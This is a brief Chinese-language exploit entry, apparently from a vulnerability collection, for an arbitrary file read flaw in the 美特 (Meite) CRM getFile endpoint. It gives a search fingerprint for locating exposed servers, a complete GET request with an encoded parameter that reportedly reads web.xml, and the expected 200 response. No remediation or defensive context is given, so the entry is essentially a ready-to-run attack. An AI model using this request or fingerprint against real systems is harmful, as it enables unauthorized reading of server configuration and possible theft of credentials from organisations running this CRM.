# 美特CRMgetFile存在任意文件读取漏洞

美特 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`GET /getFile?p=b9998b5475349fb121bb1c747c459f55427b7cbfdb484a28fbd4d9d992ab442923a2d0e2c189c9bae4c35e342dbb652c0711d79544ffef547bdbda75a26a27c6 HTTP/1.1`

**Payload**
```
读取web.xml
```
- **响应特征**：200